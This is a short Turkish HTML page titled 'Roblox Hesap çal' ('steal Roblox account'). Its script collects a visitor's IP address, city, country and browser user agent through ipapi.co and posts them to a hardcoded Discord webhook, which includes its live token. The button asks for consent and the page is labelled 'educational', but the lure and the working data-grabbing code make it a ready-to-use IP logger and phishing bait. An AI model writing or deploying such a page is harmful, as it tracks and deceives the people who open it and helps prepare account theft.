<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Bilgi Gönder</title>
  <style>
    body {
      font-family: sans-serif;
      background: #000;
      color: #22c55e;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    button {
      background: #22c55e;
      color: #000;
      padding: 10px 20px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      margin-top: 1rem;
    }
  </style>
</head>
<body>
  <h2>Roblox Hesap çal</h2>
  <p>Devam etmek için lütfen onay verin:</p>
  <button onclick="sendInfo()">Bilgilerini Gönder</button>

  <script>
    async function sendInfo() {
      const webhookURL = "https://discord.com/api/webhooks/1401256561866965085/UuTNQ7rf450MaPsORmXmxuxSI74Yz1eeSIvQs7rpbQABJtbmh7qBexGlOJrmJaq2tmr1";

      try {
        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());

        const payload = {
          embeds: [{
            title: "Kullanıcı Onaylı Sistem Bilgisi",
            color: 0x22c55e,
            fields: [
              { name: "IP", value: ipData.ip || "Yok", inline: true },
              { name: "Şehir", value: ipData.city || "Bilinmiyor", inline: true },
              { name: "Ülke", value: ipData.country_name || "Bilinmiyor", inline: true },
              { name: "Tarayıcı", value: navigator.userAgent, inline: false }
            ],
            footer: { text: "Eğitim Amaçlı Gönderim" },
            timestamp: new Date().toISOString()
          }]
        };

        const response = await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          alert("Bilgiler başarıyla gönderildi.");
        } else {
          alert("Gönderim başarısız.");
        }
      } catch (err) {
        console.error(err);
        alert("Bir hata oluştu.");
      }
    }
  </script>
</body>
</html>
